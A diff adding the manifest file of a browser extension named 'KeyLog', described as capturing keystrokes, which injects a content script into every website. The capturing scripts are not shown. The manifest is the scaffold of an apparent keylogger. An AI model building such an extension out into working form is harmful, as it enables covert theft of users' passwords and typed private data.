@@ -1,0 +1,18 @@
+{
+	"manifest_version": 2,
+	"name": "KeyLog",
+	"version": "1.0.1",
+	"icons" : {
+	    "720" : "icon.png"
+	},
+	"description": "Captures keystrokes and more",
+	  "background": {
+	    "scripts": ["background.js"]
+	  },
+	"content_scripts": [
+	  {
+	    "matches": ["*://*/*"],
+	    "js": ["content.js"]
+	  }
+	]
+}
